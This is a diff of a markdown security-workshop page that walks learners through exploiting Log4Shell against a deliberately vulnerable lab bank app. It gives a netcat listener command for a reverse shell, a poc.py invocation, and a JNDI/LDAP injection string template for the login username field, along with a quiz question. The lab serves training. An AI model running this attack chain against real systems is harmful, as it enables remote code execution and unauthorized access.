@@ -39,9 +39,7 @@ We'll need two terminals side by side for our attack. You can dismiss the Welcom
 Let's start a second terminal next to it.
 
 {{% notice info %}}
-<p style='text-align: left;'>
 In the top menu go to View, Layout and click Horizontol Split. In our second panel click on the '+' to start a new terminal. You should now have two terminals side by side.
-</p>
 {{% /notice %}}
 
 ![alt_text](images/2terms.png "image_tooltip")
@@ -67,9 +65,7 @@ We will use the tools netcat.sh and poc.py in tandem with Log4janky bank to expl
 #### Terminal 1:
 Prepare to receive an incoming connection which will provide us a reverse shell into the running application host
 
-To do this run the netcat.sh utility using a unique port number found in the "NetCatPort" range located in the Output properties panel.
-
-Eg.
+To do this run the netcat.sh utility using a unique port number found in the "NetCatPort" range located in the Output properties panel. For example:
 
 ```
 bash netcat.sh NetCatPort
@@ -86,20 +82,14 @@ Here's what we're going to do.
 
 We worked out in a previous Task that if we log into the Bank with a bad username and password it said it was logging our details. One would assume that it may specifically log the username in order to see if this was a brute force attack.
 
-If we take advantage of what we know above we can craft a loggable username that will trigger our vulnerability. Let's start with putting something in variable brackets that needs to be resolved very much like it does in Cloud Formation
+If we take advantage of what we know above we can craft a loggable username that will trigger our vulnerability. Let's start with putting something in variable brackets that needs to be resolved very much like it does in CloudFormation
 
-Eg. Both Cloud Formation and Java use a variable format notation like
-`${resolvable variable}`
-We know that if we use JNDI to indicate that we are binding a new java class. That would look like
+Both CloudFormation and Java use a variable format notation like `${resolvable variable}`. We know that if we use JNDI to indicate that we are binding a new java class. That would look like `${jndx:path to my java class}`. Finally, rather than a direct path to a class we provide an LDAP server which Java can also resolve. Our malicious LDAP server will return a simple web server to offer up a malicious new Java class. Clever isn't it!
 
-`${jndx:path to my java class}`
-Finally, rather than a direct path to a class we provide an LDAP server which Java can also resolve. Our malicious LDAP server will return a simple web server to offer up a malicious new Java class. Clever isn't it!
-
-The final result will actually look like this
-
+The final result will actually look like this:
 `${jndx:ldxp://yourip:1389/a}`
-We're going to need our IP address so the Bank knows where to find us.
-We will also need to pick a port that is externally available.
+
+We're going to need our IP address so the Bank knows where to find us. We will also need to pick a port that is externally available.
 
 Check the Output Properties panel of our setup CloudFormation for the available port ranges we will need. You can choose any unique port between the ranges provided in the output for the command parameters:
 
@@ -108,12 +98,9 @@ Check the Output Properties panel of our setup CloudFormation for the available 
 
 Let's run our `poc.py` code using these parameters. The NetCat Port is the same one we used back in Step 1.
 
-Eg.
-
 ```
-python3 poc.py --userip Cloud9IP  --webport WebPort  --lport NetCatPort
+python3 poc.py --userip <Cloud9IP>  --webport <WebPort>  --lport <NetCatPort>
 ```
-
 
 The output will explain each step. It will even generate a new Exploit.class on the fly, start up a webserver to serve it up and will give you the jndi string you require to being our attack.
 
@@ -126,4 +113,4 @@ Listening on 0.0.0.0:1389
 
 What is the unique generated attack string?
 
-Lets move on to attacking the bank with our prepared Log4Shell exploit...
+Let's move on to attacking the bank with our prepared Log4Shell exploit...
